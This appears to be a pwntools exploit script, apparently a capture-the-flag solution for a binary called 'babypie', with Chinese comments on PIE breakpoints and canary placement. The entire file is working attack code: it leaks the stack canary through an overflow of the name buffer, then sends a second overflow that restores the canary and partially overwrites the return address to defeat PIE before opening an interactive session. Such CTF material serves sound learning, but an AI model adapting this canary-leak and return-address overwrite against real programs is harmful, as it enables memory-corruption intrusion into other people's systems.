from pwn import *
# context(arch='amd64', os='linux', log_level = 'debug')

# 开启pie后设置断点获取查看数据
# b *$rebase(0x933)
# p *$rebase(0x933)

# canary在buf最后八个字节

p=process('babypie')

text1 = b'a' * (0x30 - 7 - 4) + b'bbbb'
p.recvuntil('Input your Name:\n')
p.send(text1)

p.recvuntil('bbbb')
out = p.recv()[:7]

text2 = b'a' * (0x30 - 8) + b'\0' + out  + b'a' * 8 + b'\x42'
p.send(text2)
p.interactive()
